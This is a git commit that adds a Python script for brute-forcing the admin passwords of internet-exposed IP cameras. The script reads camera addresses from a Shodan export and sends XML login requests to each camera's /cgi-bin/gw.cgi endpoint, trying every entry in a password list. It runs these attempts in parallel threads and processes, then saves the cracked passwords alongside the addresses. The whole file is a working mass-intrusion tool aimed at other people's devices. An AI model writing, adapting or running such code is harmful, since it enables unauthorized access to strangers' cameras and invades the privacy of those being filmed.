583e4e16f78afc16f6b5860b86df17b6bf85fa8c
linlinhaohao888 <linlinhaohao.888@163.com>
2019-12-12 23:02:00 +0800

    first commit

---
+++ main.py
@@ -0,0 +1,112 @@
+from threading import Thread
+import json
+import xml.etree.ElementTree as ET
+import requests
+import numpy as np
+from multiprocessing import Pool
+
+url_suffix = "/cgi-bin/gw.cgi"
+get_xml_str = '<juan ver="" squ="" dir="0"><rpermission usr="admin" pwd=""><config base=""/><playback ' \
+              'base=""/></rpermission></juan>'
+head = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
+                      'Chrome/79 Safari/537.36'}
+file_path = "shodan_data.json"
+f = open('passwords.txt', 'r')
+passwords = np.array(f.read().splitlines())
+f.close()
+
+
+class MyThread(Thread):
+    def __init__(self, func, args):
+        super(MyThread, self).__init__()
+        self.func = func
+        self.args = args
+        self.result = None
+
+    def run(self):
+        self.result = self.func(*self.args)
+
+    def get_result(self):
+        return self.result
+
+
+class BreakError(Exception):
+
+    def __init__(self):
+        super().__init__()
+
+
+def acquire_all_cameras():
+    with open("shodan_data.json", 'r+') as file:
+        lines = file.readlines()
+        result = []
+        for line in lines:
+            data = json.loads(line)
+            result.append(data)
+        return result
+
+
+def try_out_passwords(url):
+    print("Testing {}:".format(url))
+    url = url + url_suffix
+
+    def try_out_single_password(pwd):
+        root = ET.fromstring(get_xml_str)
+        login = root.find('rpermission')
+        login.set('pwd', pwd)
+        params = {'xml': ET.tostring(root).decode('utf-8')}
+        res = requests.get(url=url, params=params, headers=head)
+        if res.status_code != 200:
+            print("Cannot connect {}".format(url))
+        try:
+            res_root = ET.fromstring(res.text)
+            if res_root.find('rpermission') is None:
+                return None
+            if res_root.find('rpermission').get('remain') == 0:
+                return None
+            if res_root.find('rpermission').get('errno') == '0':
+                return True
+            return False
+        except ET.ParseError as e:
+            return None
+
+    results = [False] * len(passwords)
+    num_threads = 10
+    len_passwords = len(passwords)
+    num_iterate = len_passwords // num_threads + 1
+    try:
+        for iterate in range(num_iterate):
+            threads = []
+            for index in range(iterate * num_threads, min(len_passwords, (iterate + 1) * num_threads)):
+                t = MyThread(try_out_single_password, args=(passwords[index],))
+                t.setDaemon(True)
+                t.start()
+                threads.append((t, index))
+            for t, index in threads:
+                t.join()
+                result = t.get_result()
+                if result:
+                    results[index] = True
+                    raise BreakError
+                if result is None:
+                    raise BreakError
+    except BreakError as e:
+        pass
+    pwd = passwords[results]
+    if len(pwd) > 0:
+        return pwd[0]
+    else:
+        return None
+
+
+if __name__ == "__main__":
+    cameras = acquire_all_cameras()
+    addresses = ["http://" + camera['ip_str'] + ":" + str(camera['port']) for camera in cameras]
+    pool = Pool(6)
+    actual_passwords = pool.map(try_out_passwords, addresses)
+    pool.close()
+    pool.join()
+    print(actual_passwords)
+    actual_passwords = np.array(actual_passwords)
+    addresses = np.array(addresses)
+    np.save("results", (actual_passwords, addresses))
